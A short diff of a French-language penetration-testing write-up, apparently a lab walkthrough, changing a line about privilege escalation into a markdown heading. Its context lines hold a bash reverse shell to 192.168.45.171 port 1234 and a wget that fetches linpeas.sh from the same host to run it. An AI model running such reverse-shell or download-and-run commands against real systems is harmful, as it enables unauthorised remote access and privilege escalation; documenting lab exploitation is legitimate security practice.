@@ -27,7 +27,7 @@ Pour l'exploitation, j'ai trouvé un bon script tout fait au lieu de m'embêter 
     /bin/bash -i >& /dev/tcp/192.168.45.171/1234 0>&1
     cat local.txt
 
-Élévation de privilèges classique avec un CVE : 
+### Élévation de privilèges classique avec un CVE : 
 
     wget http://192.168.45.171/linpeas.sh
     chmod u+x ./linpeas.sh
